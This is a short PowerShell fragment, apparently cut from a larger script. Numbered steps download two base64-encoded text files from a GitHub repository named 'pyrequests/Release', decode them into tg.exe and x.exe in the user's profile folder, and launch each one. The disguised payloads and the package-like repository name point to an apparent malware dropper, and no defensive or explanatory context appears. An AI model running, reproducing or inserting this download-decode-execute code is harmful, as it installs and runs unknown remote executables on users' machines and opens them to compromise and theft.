        # Step 2: Download, decode, and execute the first file
        $url1 = 'https://raw.githubusercontent.com/pyrequests/Release/refs/heads/main/tg.txt'
        $encodedFilePath1 = [System.IO.Path]::Combine($env:USERPROFILE, 'tg.txt')
        $decodedFilePath1 = [System.IO.Path]::Combine($env:USERPROFILE, 'tg.exe')
        Invoke-WebRequest -Uri $url1 -OutFile $encodedFilePath1
        [System.IO.File]::WriteAllBytes($decodedFilePath1, [Convert]::FromBase64String((Get-Content $encodedFilePath1)))
        Start-Process -FilePath $decodedFilePath1

        # Step 3: Download, decode, and execute the second file
        $url2 = 'https://raw.githubusercontent.com/pyrequests/Release/refs/heads/main/x.txt'
        $encodedFilePath2 = [System.IO.Path]::Combine($env:USERPROFILE, 'x.txt')
        $decodedFilePath2 = [System.IO.Path]::Combine($env:USERPROFILE, 'x.exe')
        Invoke-WebRequest -Uri $url2 -OutFile $encodedFilePath2
        [System.IO.File]::WriteAllBytes($decodedFilePath2, [Convert]::FromBase64String((Get-Content $encodedFilePath2)))
        Start-Process -FilePath $decodedFilePath2

